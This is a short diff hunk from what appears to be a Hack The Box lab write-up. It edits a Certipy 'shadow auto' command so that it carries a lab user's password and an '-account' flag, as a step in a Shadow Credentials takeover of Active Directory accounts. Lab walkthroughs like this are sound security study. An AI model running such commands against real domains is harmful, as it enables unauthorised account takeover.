@@ -420,5 +420,5 @@ Certipy’s shadow command has an auto action, which will add a new Key Cred
 But make sure to check out the pywhisker method as it explains the whole thing in a way better manner.
 	 Required Tools:  Impacket, certipy-ad 
 ```bash
-certipy shadow auto -u p.agila@fluffy.htb -p 
+certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account 
 ```
